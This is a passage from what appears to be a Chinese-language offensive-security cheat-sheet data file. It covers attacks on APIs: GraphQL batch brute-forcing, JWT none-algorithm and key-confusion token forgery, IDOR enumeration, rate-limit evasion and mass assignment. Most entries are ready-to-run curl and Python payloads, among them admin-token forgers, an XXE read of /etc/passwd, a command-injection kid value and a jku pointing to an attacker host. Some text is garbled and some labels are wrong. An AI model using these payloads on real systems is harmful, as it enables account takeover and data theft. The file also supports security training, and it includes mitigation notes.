        command: '# 发送多个查询数组\n[\n  {"query": "{ user(id: 1) { name } }"},\n  {"query": "{ user(id: 2) { name } }"},\n  {"query": "{ user(id: 3) { name } }"},\n  {"query": "{ user(id: 4) { name } }"}\n]\n\n# 使用curl发送\ncurl -X POST http://target.com/graphql \\\n  -H "Content-Type: application/json" \\\n  -d \'[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]\'', 
        description: '使用数组批量查询', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '[{},{},{}]', explanation: 'JSON数组格式' },
          { part: 'query', explanation: 'GraphQL查询字段' }
        ]
      },
      { 
        title: '3. �力�解', 
        command: '# 批量密码尝试\nmutation {\n  attempt1: login(email: "admin@test.com", password: "password1") { token }\n  attempt2: login(email: "admin@test.com", password: "password2") { token }\n  attempt3: login(email: "admin@test.com", password: "password3") { token }\n  attempt4: login(email: "admin@test.com", password: "password4") { token }\n  attempt5: login(email: "admin@test.com", password: "password5") { token }\n}\n\n# 枚举用户\nquery {\n  check1: userExists(email: "admin@test.com")\n  check2: userExists(email: "root@test.com")\n  check3: userExists(email: "test@test.com")\n}', 
        description: '批量�力�解', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'login', explanation: '登录mutation' },
          { part: 'userExists', explanation: '用户存在检查查询' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '绕过批量限制', 
        command: '# 分散查询\n# 使用不同的查询格式\nquery BatchQuery {\n  user1: user(id: 1) { ...UserFields }\n  user2: user(id: 2) { ...UserFields }\n}\nfragment UserFields on User {\n  name\n  email\n}\n\n# 使用变量批量\nquery GetUser($ids: [ID!]!) {\n  users(ids: $ids) {\n    name\n    email\n  }\n}',
        description: '绕过批量查询限制', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# 分散查询\n# 使用不同的查询格式\nquery Bat', explanation: '绕过技术', type: 'technique' }
        ]
      }
    ],
    tutorial: {
      overview: 'GraphQL批量查询(Batching)允许在单个HTTP请求中发送多个查询操作，攻击者可利用此特性绕过基于请求频率的速率限制、进行暴力破解(OTP/密码)或发起批量数据查询。',
      vulnerability: 'GraphQL批量查询攻击：1)在一个请求中发送数千个mutation操作暴力破解OTP/密码(绕过请求级速率限制) 2)使用alias在单个query中批量查询不同用户数据 3)数组形式batch查询([{query1},{query2},...])规避认证重试检测。',
      exploitation: '完�利用流程：\n1. 测试是否支持批量查询\n2. 使用别名或数组批量查询\n3. 绕过速率限制\n4. 批量枚举或�力�解',
      mitigation: '防御措施：\n1. 限制批量查询数量\n2. 基于查询复杂度限流\n3. 实施查询深度限制\n4. 监控异常查询模式',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rest-api-security',
    name: 'REST API安全测试',
    description: 'REST API安全测试与漏�利用',
    category: 'API安全',
    subCategory: 'REST API',
    tags: ['rest', 'api', 'security', 'testing'],
    prerequisites: ['目标使用REST API', '了解API端点'],
    execution: [
      { 
        title: '1. API端点发现', 
        command: '# 常见API端点\n/api/v1/users\n/api/v2/products\n/api/docs\n/api/swagger.json\n/api/openapi.json\n/swagger-ui.html\n/redoc\n\n# 使用工具发现\nffuf -u http://target.com/api/FUZZ -w api_endpoints.txt\nwfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ', 
        description: '发现API端点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/api/v1/', explanation: 'API版本路径' },
          { part: '/swagger.json', explanation: 'Swagger文档' }
        ]
      },
      { 
        title: '2. 认证测试', 
        command: '# 测试未授权访问\ncurl http://target.com/api/v1/users\n\n# 测试JWT\ncurl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users\n\n# 测试API Key\ncurl -H "X-API-Key: key123" http://target.com/api/v1/users\n\n# 测试Basic Auth\ncurl -u user:pass http://target.com/api/v1/users', 
        description: '测试API认证', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Authorization: Bearer', explanation: 'Bearer Token认证' },
          { part: 'X-API-Key', explanation: 'API Key认证�' }
        ]
      },
      { 
        title: '3. HTTP方法测试', 
        command: '# 测试允许的HTTP方法\ncurl -X OPTIONS http://target.com/api/v1/users -v\n\n# 尝试PUT修改\ncurl -X PUT -H "Content-Type: application/json" \\\n  -d \'{"name":"hacked"}\' http://target.com/api/v1/users/1\n\n# 尝试DELETE删除\ncurl -X DELETE http://target.com/api/v1/users/1\n\n# 尝试PATCH部分�新\ncurl -X PATCH -H "Content-Type: application/json" \\\n  -d \'{"role":"admin"}\' http://target.com/api/v1/users/1', 
        description: '测试HTTP方法', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'OPTIONS', explanation: '获取支持的HTTP方法' },
          { part: 'PUT', explanation: '创建或替换资源' },
          { part: 'PATCH', explanation: '部分�新资源' }
        ]
      },
      { 
        title: '4. 参数污染', 
        command: '# 参数污染测试\n# 重复参数\n/api/users?id=1&id=2\n/api/users?name=admin&name=user\n\n# 数组参数\n/api/users?id[]=1&id[]=2\n/api/users?name[0]=admin&name[1]=user\n\n# JSON注入\n/api/users?filter={"role":"admin"}\n/api/users?sort=role&order=desc; DROP TABLE users--', 
        description: '测试参数污染', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'id=1&id=2', explanation: '重复参数' },
          { part: 'id[]=1', explanation: '数组参数' }
        ]
      },
      { 
        title: '5. 内容类型测试', 
        command: '# 测试不同Content-Type\ncurl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users\ncurl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users\ncurl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users\n\n# XML外部实体\ncurl -H "Content-Type: application/xml" \\\n  -d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>\' \\\n  http://target.com/api/users', 
        description: '测试内容类型处理', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Content-Type', explanation: 'HTTP内容类型�' },
          { part: 'application/xml', explanation: 'XML格式' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'API版本绕过', 
        command: '# 尝试不同API版本\n/api/v1/users  # 可能已修复\n/api/v2/users  # 可能未修复\n/api/users     # 旧版本可能无保护\n\n# 尝试内部API\n/internal/api/users\n/private/api/users\n/_api/users',
            syntaxBreakdown: [
              { part: '# 尝试不同API版本\n/api/v1/users  # 可能已修复\n/api/v2/users  # 可能未修复\n/api/users     # 旧版', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用不同API版本绕过', 
        platform: 'all'
      },
      { 
        title: '编码绕过', 
        command: '# URL编码\ncurl http://target.com/api/users/%31  # /users/1\n\n# Unicode编码\ncurl http://target.com/api/users/%u0031\n\n# 双重URL编码\ncurl http://target.com/api/users/%2531',
            syntaxBreakdown: [
              { part: '# URL编码\ncurl http://target.com/api/users/%31  # /users/1\n\n# Unicode编码\ncurl h', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'REST API安全测试关注认证授权缺陷、输入验证不足、响应数据过度暴露、速率限制缺失等问题。API作为现代应用的核心，其安全性直接影响整个业务系统的数据安全。',
      vulnerability: 'REST API常见漏洞：1)认证缺失(API端点无需认证即可访问) 2)BOLA/IDOR(通过遍历ID访问他人资源) 3)批量赋值(Mass Assignment,提交额外字段修改权限) 4)过度数据暴露(响应包含不必要的敏感字段) 5)缺乏速率限制。',
      exploitation: '完�利用流程：\n1. 发现API端点和文档\n2. 测试认证机制\n3. 测试HTTP方法\n4. 测试参数处理\n5. 测试内容类型\n6. 寻找注入点',
      mitigation: '防御措施：\n1. 实施严格的认证授权\n2. 限制HTTP方法\n3. 输入验证和过滤\n4. 速率限制\n5. API版本管理\n6. 安全的CORS配置',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'jwt-none-alg',
    name: 'JWT None算法攻击',
    description: '利用JWT None算法绕过签名验证',
    category: 'API安全',
    subCategory: 'JWT安全',
    tags: ['jwt', 'none', 'algorithm', 'bypass'],
    prerequisites: ['目标使用JWT认证', '服务器未正确验证算法'],
    execution: [
      { 
        title: '1. 解码JWT', 
        command: '# 在线解码\nhttps://jwt.io\n\n# 使用命令行\necho "HEADER" | base64 -d\necho "PAYLOAD" | base64 -d\n\n# 使用Python\nimport jwt\ndecoded = jwt.decode(token, options={"verify_signature": False})\nprint(decoded)', 
        description: '解码JWT令牌', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'HEADER', explanation: 'JWT�部，包含算法信息' },
          { part: 'PAYLOAD', explanation: 'JWT载荷，包含用户数据' }
        ]
      },
      { 
        title: '2. 构造None算法Token', 
        command: '# 修改�部为none算法\n# 原始�部\n{"alg":"HS256","typ":"JWT"}\n\n# 修改为\n{"alg":"none","typ":"JWT"}\n{"alg":"None","typ":"JWT"}\n{"alg":"NONE","typ":"JWT"}\n{"alg":"nOnE","typ":"JWT"}\n\n# 使用Python构造\nimport base64, json\nheader = {"alg":"none","typ":"JWT"}\npayload = {"sub":"admin","iat":1516239022}\ntoken = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \\\n        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."\nprint(token)', 
        description: '构造None算法Token', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '"alg":"none"', explanation: '设置算法为none' },
          { part: 'rstrip("=")', explanation: '移除Base64填充' }
        ]
      },
      { 
        title: '3. 修改用户权限', 
        command: '# 修改payload提权\n# 原始payload\n{"sub":"user","role":"user","iat":1516239022}\n\n# 修改为\n{"sub":"admin","role":"admin","iat":1516239022}\n\n# 完�攻击\nimport base64, json\nheader = base64.urlsafe_b64encode(b\'{"alg":"none","typ":"JWT"}\').decode().rstrip("=")\npayload = base64.urlsafe_b64encode(b\'{"sub":"admin","role":"admin"}\').decode().rstrip("=")\ntoken = header + "." + payload + "."\nprint(token)', 
        description: '修改用户权限', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '"role":"admin"', explanation: '修改角色为管理员' },
          { part: '"sub":"admin"', explanation: '修改主体为admin' }
        ]
      },
      { 
        title: '4. 发送恶意Token', 
        command: '# 使用curl发送\ncurl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin\n\n# 空签名测试\ncurl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin', 
        description: '发送恶意Token', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Bearer', explanation: 'Bearer认证方案' },
          { part: '.', explanation: '空签名部分' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '算法混淆', 
        command: '# 尝试不同变体\n{"alg":"none"}\n{"alg":"None"}\n{"alg":"NONE"}\n{"alg":"nOnE"}\n{"alg":""}\n{"alg":null}\n\n# 移除alg字段\n{"typ":"JWT"}',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 尝试不同变体\n{"alg":"none"}\n{"alg":"None"}\n{"alg":"NONE"}\n{"alg":"nOnE"}\n{"alg":""}\n{"alg":null}\n\n# 移除alg字段\n{"typ":"JWT"}', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '尝试算法变体', 
        platform: 'all'
      },
      { 
        title: '签名绕过', 
        command: '# 空签名\nheader.payload.\n\n# 任意签名\nheader.payload.anysignature\n\n# 使用原始签名\n# 某些库会忽略签名验证',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 空签名\nheader.payload.\n\n# 任意签名\nheader.payload.anysignature\n\n# 使用原始签名\n# 某些库会忽略签名验证', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '签名绕过变体', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'JWT None算法攻击利用某些JWT库接受alg字段为"none"的Token(表示不需要签名验证)。攻击者将Token的算法改为none并移除签名部分，篡改payload中的声明(如提升角色)后即可绕过认证。',
      vulnerability: 'JWT None算法漏洞：1)将Header中的alg改为"none"/"None"/"NONE"/"nOnE"等变体 2)移除Token第三部分(签名)或置空 3)修改Payload中的用户角色/ID/权限声明 4)重新Base64编码后发送。支持none算法的库会跳过签名验证。',
      exploitation: '完�利用流程：\n1. 获取有效JWT Token\n2. 解码分析Token结构\n3. 修改算法为none\n4. 修改payload提权\n5. 移除或保留空签名\n6. 发送恶意Token',
      mitigation: '防御措施：\n1. 禁用none算法\n2. 严格验证算法类型\n3. 使用成熟的JWT库\n4. 验证签名不为空\n5. 设置token过期时�',
      difficulty: 'beginner'
    }
  },
  {
    id: 'jwt-key-confusion',
    name: 'JWT密钥混淆攻击',
    description: '利用JWT算法混淆实现签名绕过',
    category: 'API安全',
    subCategory: 'JWT安全',
    tags: ['jwt', 'algorithm', 'confusion', 'rs256'],
    prerequisites: ['目标使用RS256算法', '可获取公钥'],
    execution: [
      { 
        title: '1. 获取公钥', 
        command: '# 从证书获取\ncurl -k https://target.com/.well-known/jwks.json\n\n# 从SSL证书获取\necho | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout\n\n# 从JWT�部获取\n# 解码JWT�部，查找x5c或jku字段\n\n# 常见公钥位置\n/.well-known/jwks.json\n/api/keys\n/public.key\n/pubkey.pem', 
        description: '获取JWT公钥', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'jwks.json', explanation: 'JSON Web Key Set' },
          { part: 'x5c', explanation: 'X.509证书链' }
        ]
      },
      { 
        title: '2. 算法混淆攻击', 
        command: '# 将RS256改为HS256\n# 使用公钥作为HMAC密钥\n\nimport jwt\nimport base64\n\n# 获取公钥\npublic_key = open("public.pem").read()\n\n# 构造payload\npayload = {"sub":"admin","role":"admin"}\n\n# 使用公钥作为HMAC密钥签名\ntoken = jwt.encode(payload, public_key, algorithm="HS256")\nprint(token)', 
        description: '算法混淆攻击', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'RS256', explanation: 'RSA签名算法' },
          { part: 'HS256', explanation: 'HMAC签名算法' },
          { part: '公钥作为密钥', explanation: '使用公钥作为HMAC密钥' }
        ]
      },
      { 
        title: '3. 发送恶意Token', 
        command: '# 使用构造的Token\ncurl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin\n\n# Python脚本\nimport requests\nheaders = {"Authorization": f"Bearer {token}"}\nresponse = requests.get("http://target.com/api/admin", headers=headers)\nprint(response.text)', 
        description: '发送恶意Token', 
        },
      ],
    wafBypass: [
      { 
        title: 'kid注入', 
        command: '# kid参数注入\n# 修改JWT头部kid字段\n{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}\n\n# SQL注入kid\n{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}\n\n# 命令注入kid\n{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}', 
        description: '通过kid参数注入', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'kid', explanation: 'Key ID，指定使用的密钥' }
        ]
      },
      { 
        title: 'jku/x5u绕过', 
        command: '# jku指向攻击者服务器\n{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}\n\n# x5u指向攻击者证书\n{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}\n\n# 在攻击者服务器托管恶意密钥', 
        description: '通过jku/x5u绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'jku', explanation: 'JWK Set URL' },
          { part: 'x5u', explanation: 'X.509 URL' }
        ]
      }
    ],
    tutorial: {
      overview: 'JWT密钥混淆(Algorithm Confusion)攻击将RS256(非对称)签名改为HS256(对称)，然后使用公钥(通常可获取)作为HMAC密钥对Token签名，如果服务端使用同一密钥变量验证则攻击成功。',
      vulnerability: 'JWT密钥混淆攻击原理：RS256用私钥签名/公钥验证，HS256用共享密钥签名/验证。当服务端代码用通用的"key"变量(存储公钥)进行验证时，攻击者将alg改为HS256，用公钥(可从/jwks.json或X509证书获取)签名Token即可通过验证。',
      exploitation: '完�利用流程：\n1. 获取目标公钥\n2. 将算法从RS256改为HS256\n3. 使用公钥作为HMAC密钥签名\n4. 发送恶意Token',
      mitigation: '防御措施：\n1. 明确指定允许的算法\n2. 不信任JWT中的alg字段\n3. 使用白名单验证算法\n4. 分离公钥和对称密钥验证逻辑',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'api-idor',
    name: 'IDOR不安全的�接对象引用',
    description: '利用IDOR漏�访问未授权资源',
    category: 'API安全',
    subCategory: 'IDOR',
    tags: ['idor', 'api', 'authorization', 'bypass'],
    prerequisites: ['目标使用ID引用资源', '存在授权检查缺陷'],
    execution: [
      { 
        title: '1. 识别ID参数', 
        command: '# 常见ID参数位置\n/api/users/123\n/api/orders?id=123\n/api/documents/abc-123\n/api/profile?user_id=123\n\n# 观察响应\n# 记录不同ID返回的数据差异', 
        description: '识别ID参数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/users/123', explanation: 'URL路径中的ID' },
          { part: '?id=123', explanation: '查询参数中的ID' }
        ]
      },
      { 
        title: '2. 枚举ID', 
        command: '# 数字ID枚举\nfor i in $(seq 1 1000); do\n  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt\ndone\n\n# 使用Burp Intruder\n# Payload: Numbers 1-10000\n# GET /api/users/{id}\n\n# UUID枚举\n# 使用ffuf\nffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"', 
        description: '枚举ID值', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'seq 1 1000', explanation: '生成1到1000的数字' },
          { part: 'ffuf', explanation: 'Web模糊测试工具' }
        ]
      },
      { 
        title: '3. 批量检测', 
        command: '# Python脚本批量检测\nimport requests\n\ntoken = "YOUR_TOKEN"\nfor i in range(1, 100):\n    r = requests.get(\n        f"http://target.com/api/users/{i}",\n        headers={"Authorization": f"Bearer {token}"}\n    )\n    if r.status_code == 200:\n        print(f"ID {i}: {r.json()}")\n\n# 检测数据泄露\n# 比较不同用户访问同一ID的响应', 
        description: '批量检测IDOR', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target.com/api/users/{i}', explanation: '目标URL', type: 'value' },
          { part: '# Python脚本批量检测\nimport request', explanation: '探测载荷', type: 'value' }
        ]
      },
      { 
        title: '4. 跨用户访问', 
        command: '# 尝试访问其他用户数据\n# 用户A的Token访问用户B的数据\n\n# 修改请求中的ID\nGET /api/users/2  # 原本是用户1\nGET /api/orders?user_id=2  # 原本是user_id=1\n\n# 修改POST/PUT请求体\n{\n  "user_id": 2,  # 修改为其他用户ID\n  "amount": 1000\n}', 
        description: '跨用户访问测试', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'user_id', explanation: '请求体中的用户ID' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'ID变体绕过', 
        command: '# 数字变体\n/api/users/001\n/api/users/1\n/api/users/0x1\n/api/users/1.0\n\n# 编码绕过\n/api/users/%31  # URL编码\n/api/users/MSAg  # Base64编码\n\n# 数组绕过\n/api/users?id[]=1&id[]=2\n/api/users[0]=1&users[1]=2',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 数字变体\n/api/users/001\n/api/users/1\n/api/users/0x1\n/api/users/1.0\n\n# 编码绕过\n/api/users/%31 # URL编码\n/api/users/MSAg # Base64编码\n\n# 数组绕过\n/api/users?id[]=1&id[]=2\n/api/users[0]=1&users[1]=2', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: 'ID变体绕过', 
        platform: 'all'
      },
      { 
        title: '参数污染', 
        command: '# 参数污染\n/api/users?id=1&id=2\n/api/users?id=2&id=1\n\n# JSON注入\n{"id": 1, "id": 2}\n\n# 批量操作\n/api/users/batch?ids=1,2,3,4,5',
            syntaxBreakdown: [
              { part: '#', explanation: '命令/载荷起始', type: 'command' },
              { part: ' 参数污染\n/api/users?id=1&id=2\n/api/users?id=2&id=1\n\n# JSON注入\n{"id": 1, "id": 2}\n\n# 批量操作\n/api/users/batch?ids=1,2,3,4,5', explanation: '参数与载荷内容', type: 'value' }
            ],
        description: '参数污染绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'IDOR(Insecure Direct Object Reference)不安全的直接对象引用是API中最常见的高危漏洞，攻击者通过修改请求中的对象标识符(用户ID/订单号/文件名)访问或操作其他用户的资源。',
      vulnerability: 'IDOR漏洞表现形式：1)水平越权(GET /api/users/1001 → /api/users/1002查看他人资料) 2)垂直越权(普通用户访问管理员接口) 3)对象级授权缺失(修改/删除他人资源) 4)可预测的ID(自增数字/UUID可枚举) 5)批量IDOR(遍历导出数据)。',
      exploitation: '完�利用流程：\n1. 识别使用ID的API端点\n2. 使用自己的�户测试\n3. 枚举其他ID值\n4. 验证是否能访问其他用户数据\n5. 批量枚举敏感数据',
      mitigation: '防御措施：\n1. 实施对象级授权检查\n2. 使用不可预测的ID(UUID)\n3. 验证用户对资源的所有权\n4. 记录异常访问模式\n5. 实施速率限制',
      difficulty: 'beginner'
    }
  },
  {
    id: 'api-rate-limit',
    name: 'API速率限制绕过',
    description: '绕过API速率限制进行�力攻击',
    category: 'API安全',
    subCategory: '速率限制',
    tags: ['api', 'rate-limit', 'bypass', 'brute-force'],
    prerequisites: ['目标有速率限制', '限制实现有缺陷'],
    execution: [
      { 
        title: '1. 检测速率限制', 
        command: '# 快速发送请求检测限制\nfor i in $(seq 1 100); do\n  curl -s -o /dev/null -w "%{http_code}\\n" http://target.com/api/test\ndone\n\n# 观察响应\n# 429 Too Many Requests\n# 403 Forbidden\n# 自定义错误消息', 
        description: '检测速率限制', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '429', explanation: 'HTTP状态码，请求过多' },
          { part: '%{http_code}', explanation: 'curl输出HTTP状态码' }
        ]
      },
      { 
        title: '2. IP绕过', 
        command: '# X-Forwarded-For绕过\ncurl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test\ncurl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test\ncurl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test\n\n# 其他IP�\nX-Real-IP: 1.2.3.4\nX-Originating-IP: 1.2.3.4\nX-Remote-IP: 1.2.3.4\nX-Client-IP: 1.2.3.4\nTrue-Client-IP: 1.2.3.4\n\n# 自动化\nfor i in $(seq 1 100); do\n  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test\ndone', 
        description: '使用IP�绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-Forwarded-For', explanation: '代理转发的原始IP' },
          { part: 'X-Real-IP', explanation: '真实客户端IP' }
        ]
      },
      { 
        title: '3. 分布式绕过', 
        command: '# 使用多个代理\n# 配置代理池\nproxies = [\n    "http://proxy1:8080",\n    "http://proxy2:8080",\n    "http://proxy3:8080"\n]\n\n# Python脚本\nimport requests\nproxies_list = ["http://proxy1:8080", "http://proxy2:8080"]\nfor i, proxy in enumerate(proxies_list):\n    requests.get("http://target.com/api/test", proxies={"http": proxy})\n\n# 使用Tor\n# 每次请求�换Tor电路\nimport stem.process\nimport requests\n\n# 使用云函数\n# AWS Lambda, Azure Functions等', 
        description: '分布式绕过速率限制', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://proxy1:8080', explanation: '目标URL', type: 'value' },
          { part: '# 使用多个代理\n# 配置代理池\nproxies = [', explanation: '绕过技术', type: 'technique' }
        ]
      },
      { 
        title: '4. 其他绕过技术', 
        command: '# 用户代理绕过\ncurl -A "Googlebot" http://target.com/api/test\ncurl -A "Bingbot" http://target.com/api/test\n\n# 认证绕过\n# 使用不同�户\nfor token in $TOKENS; do\n  curl -H "Authorization: Bearer $token" http://target.com/api/test\ndone\n\n# HTTP/2多路复用\n# 单个连接发送多个请求\n\n# 缓慢请求\n# Slowloris攻击', 
        description: '其他绕过技术', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'http://target.com/api/test\ncurl', explanation: '目标URL', type: 'value' },
          { part: '# 用户代理绕过\ncurl -A "Googlebot" ', explanation: '绕过技术', type: 'technique' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: 'API Key轮换', 
        command: '# 使用多个API Key\napi_keys = ["key1", "key2", "key3", "key4"]\nfor i, key in enumerate(api_keys):\n    requests.get("http://target.com/api/test", headers={"X-API-Key": key})\n\n# 注册多个�户获取多个Token',
            syntaxBreakdown: [
              { part: '# 使用多个API Key\napi_keys = ["key1", "key2", "key3", "key4"]\nfor i, key in enumer', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'API Key轮换', 
        platform: 'all'
      },
      { 
        title: '请求分散', 
        command: '# 添加延迟\nimport time\nfor i in range(100):\n    requests.get("http://target.com/api/test")\n    time.sleep(0.5)  # 每次请求�隔0.5秒\n\n# 分散到不同时�段\n# 使用定时任务分散请求',
            syntaxBreakdown: [
              { part: '# 添加延迟\nimport time\nfor i in range(100):\n    requests.get("http://target.com/api/test")\n    time.', explanation: 'SQL表达式', type: 'value' },
              { part: 'sleep', explanation: 'SQL关键字', type: 'keyword' },
              { part: '(0.5)  # 每次请求�隔0.5秒\n\n# 分散到不同时�段\n# 使用定时任务分散请求', explanation: 'SQL表达式', type: 'value' }
            ],
        description: '请求分散', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'API速率限制缺失允许攻击者无限制地调用API接口，可导致暴力破解(密码/OTP)、数据批量爬取、资源滥用(发送大量短信/邮件)和拒绝服务等严重安全问题。',
      vulnerability: 'API速率限制绕过：1)完全无速率限制(可无限调用) 2)仅基于IP限制(更换IP/使用代理绕过) 3)仅基于用户限制(创建多个账号) 4)仅限制某些端点(找到不受限的等价端点) 5)HTTP方法变换绕过(GET→POST) 6)增加请求参数绕过签名。',
      exploitation: '完�利用流程：\n1. 检测速率限制阈值\n2. 分析限制基于什么(IP/用户/Key)\n3. 选择合适的绕过方法\n4. 执行�力攻击',
      mitigation: '防御措施：\n1. 基于用户+IP组合限流\n2. 不信任客户端IP�\n3. 使用滑动窗口限流\n4. 实施CAPTCHA\n5. 监控异常访问模式',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'api-mass-assignment',
    name: '批量赋值漏�',
    description: '利用批量赋值漏�修改敏感字段',
    category: 'API安全',
    subCategory: '批量赋值',
    tags: ['api', 'mass-assignment', 'privilege-escalation'],
    prerequisites: ['API接受JSON输入', '存在未过滤的字段'],
    execution: [
      { 
        title: '1. 识别输入字段', 
        command: '# 正常请求\nPOST /api/users\n{\n  "name": "test",\n  "email": "test@test.com"\n}\n\n# 观察响应\n{\n  "id": 1,\n  "name": "test",\n  "email": "test@test.com",\n  "role": "user",\n  "isAdmin": false,\n  "createdAt": "2024-01-01"\n}', 
        description: '识别返回的字段', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'role', explanation: '用户角色字段' },
          { part: 'isAdmin', explanation: '管理员标志' }
        ]
      },
      { 
        title: '2. 添加敏感字段', 
        command: '# 尝试添加role字段\nPOST /api/users\n{\n  "name": "test",\n  "email": "test@test.com",\n  "role": "admin"\n}\n\n# 尝试isAdmin\n{\n  "name": "test",\n  "email": "test@test.com",\n  "isAdmin": true\n}\n\n# 尝试多个字段\n{\n  "name": "test",\n  "email": "test@test.com",\n  "role": "admin",\n  "isAdmin": true,\n  "permissions": ["read", "write", "delete"]\n}', 
        description: '添加敏感字段', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '"role": "admin"', explanation: '尝试设置管理员角色' },
          { part: '"isAdmin": true', explanation: '尝试设置管理员标志' }
        ]
      },
      { 
        title: '3. �新操作', 
        command: '# PUT/PATCH�新\nPATCH /api/users/123\n{\n  "role": "admin"\n}\n\n# 尝试修改其他用户\nPATCH /api/users/1\n{\n  "role": "admin"\n}\n\n# 尝试修改密码\nPATCH /api/users/me\n{\n  "password": "newpassword123"\n}', 
        description: '�新操作测试', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: 'PUT/PATCH�新\nPATCH', explanation: '关键参数', type: 'value' },
          { part: '/api/users/123\n{\n', explanation: '关键参数', type: 'value' },
          { part: '"role":', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '4. 嵌套对象', 
        command: '# 嵌套对象赋值\n{\n  "name": "test",\n  "settings": {\n    "notifications": true,\n    "isAdmin": true\n  }\n}\n\n# 数组赋值\n{\n  "name": "test",\n  "roles": ["admin", "superadmin"]\n}', 
        description: '嵌套对象测试', 
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '嵌套对象赋值\n{\n', explanation: '关键参数', type: 'value' },
          { part: '"name":', explanation: '关键参数', type: 'value' },
          { part: '"test",\n', explanation: '关键参数', type: 'value' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '字段变体', 
        command: '# 尝试不同字段名\nis_admin, is_Admin, IS_ADMIN\nadmin, Admin, ADMIN\nuser_type, userType, user_type_id\n\n# 尝试内部字段\n__v, _id, created_at, updated_at\npassword_hash, passwordHash',
            syntaxBreakdown: [
              { part: '# 尝试不同字段名\nis_admin, is_Admin, IS_ADMIN\nadmin, Admin, ADMIN\nuser_type, userTyp', explanation: '攻击载荷', type: 'value' }
            ],
        description: '尝试字段变体', 
        platform: 'all'
      },
      { 
        title: '类型混淆', 
        command: '# 数字转布尔\n{"isAdmin": 1}\n{"isAdmin": "true"}\n\n# 数组转字符串\n{"roles": "admin"}\n\n# 对象转数组\n{"settings": ["admin"]}',
